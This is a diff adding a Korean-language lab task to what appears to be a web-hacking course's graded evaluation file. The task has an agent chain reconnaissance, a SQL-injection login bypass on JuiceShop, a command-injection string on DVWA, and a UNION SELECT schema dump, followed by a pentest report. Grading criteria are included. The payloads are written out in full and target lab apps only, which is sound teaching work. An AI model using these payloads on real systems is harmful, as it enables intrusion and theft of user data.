@@ -833,3 +833,70 @@ steps:
 
     '
   script: ''
+- order: 100
+  instruction: '[Multi-task] 종합 웹 해킹 5단계 통합 — Recon → Fingerprint → SQLi+API → Cmd Injection → UNION 추출.'
+  bastion_prompt: |
+    종합 웹 해킹 의 PTES 5 phase 압축 chain 을 수행해줘. 졸업 evaluation.
+
+    1) [Phase 1 - Recon (nmap + fingerprint)] nmap -sV -sC -p 80,3000,8080,8443 {{WEB_IP}} +
+       curl -sI {{WEB_IP}}:3000 + curl -sI {{WEB_IP}}:8080 의 service version + 보안 헤더 점검 표.
+       발견 inventory + 공격 표면 매트릭스. PTES Stage 2 + MITRE T1595 + T1592 매핑.
+
+    2) [Phase 2 - Web Fingerprint] curl -s {{WEB_IP}}:3000/robots.txt + /sitemap.xml + curl -s {{WEB_IP}}:3000
+       | grep -oE 'meta[^>]*generator|<script src="[^"]*"' 으로 framework 식별 (Express/Angular/Node) +
+       기술 stack (npm package, CDN 사용 여부, JS framework 버전) 표. searchsploit 으로 알려진 CVE 매핑.
+       PTES Stage 2 매핑.
+
+    3) [Phase 3 - SQLi + API enum] curl -s -X POST {{WEB_IP}}:3000/rest/user/login -H 'Content-Type:
+       application/json' -d '{"email":"admin@juice-sh.op'"'"'-- ","password":"x"}' 으로 admin token 획득 →
+       curl -s -H "Authorization: Bearer $T" {{WEB_IP}}:3000/api/Users 로 전체 사용자 목록 + 민감 정보 (email,
+       password hash) 추출. OWASP A03 + A07 매핑.
+
+    4) [Phase 4 - Command Injection - DVWA] curl -s -b "PHPSESSID=XXX; security=low" -X POST
+       {{WEB_IP}}:8080/vulnerabilities/exec/ -d "ip=127.0.0.1;ip a;whoami;ps auxf;netstat -tlnp&Submit=Submit"
+       의 응답 정리 — 네트워크 인터페이스 + 사용자 + 실행 프로세스 + 열린 포트 정보 종합. OWASP A03 + CWE-78 매핑.
+
+    5) [Phase 5 - UNION SELECT 의 schema dump + 보고서] curl -s "{{WEB_IP}}:3000/rest/products/search?q=')) UNION
+       SELECT 1,name,2,3,4,5,6,7,9 FROM sqlite_master--" 의 테이블 list 추출 → 각 테이블 의 columns + 5 sample
+       row 추출. PTES Stage 7 보고서 (Executive 1 페이지 + Technical 5 finding × CVSS 3.1 + Day1 Quick Win
+       권고 5 + Roadmap 1 분기) markdown 출력. MITRE T1005 매핑.
+
+    마지막에 5 phase × (PTES Stage / 도구 / 발견 finding / OWASP/CWE/CVE 매핑 / CVSS 3.1 점수 / 권고) 의 5×6
+    매트릭스 + 종합 PTES 보고서 (Executive Summary 1 페이지 + Technical Findings 5개 + Day1 Quick Win 5 +
+    Roadmap 3 month) 출력. RoE + Scope 명시 (학습 환경 만).
+  hint: 종합 웹 해킹 5 phase chain. PTES 보고서 + Quick Win + Roadmap 이 졸업 산출물.
+  category: multi_task
+  points: 50
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: '[통합] 종합 웹 해킹 5 phase — Recon/Fingerprint/SQLi+API/CmdInj/UNION schema. PTES Stage 2/5/7 + OWASP A03/A07 + CWE-78/89 + MITRE T1190/T1595/T1592/T1005 매핑 + 5×6 매트릭스 + PTES 보고서.'
+      success_criteria:
+      - 5 phase 모두 실행
+      - PTES Stage 3 이상 매핑
+      - JuiceShop + DVWA 둘 다 침투
+      - SQLi 인증 우회 + UNION 추출 둘 다
+      - PTES 보고서 (Executive + Technical CVSS + Day1 + Roadmap)
+      - 5×6 매트릭스 + RoE 명시
+      acceptable_methods:
+      - bastion 의 multi-stage planning
+      - nmap + curl + searchsploit 표준
+      - PTES 표준 보고서 양식
+      - markdown 매트릭스 + CVSS 3.1
+      negative_signs:
+      - 3 phase 이하 만 수행
+      - PTES Stage 매핑 누락
+      - JuiceShop 또는 DVWA 한쪽만
+      - PTES 보고서 누락
+      - CVSS 점수 누락
+      - RoE 미언급 (윤리 위반)
+  target_vm: attacker
+  risk_level: low
+  answer: |
+    🤖 위 bastion_prompt 그대로. 종합 웹 해킹 5 phase + 5×6 매트릭스 + PTES 보고서.
+  answer_detail: |
+    Web Pentest 시니어 페르소나 — PTES 5 phase 압축 chain. JuiceShop + DVWA 의 종합 침투 + PTES 보고서.
+    졸업 evaluation 의 마지막 주.
+  script: ''
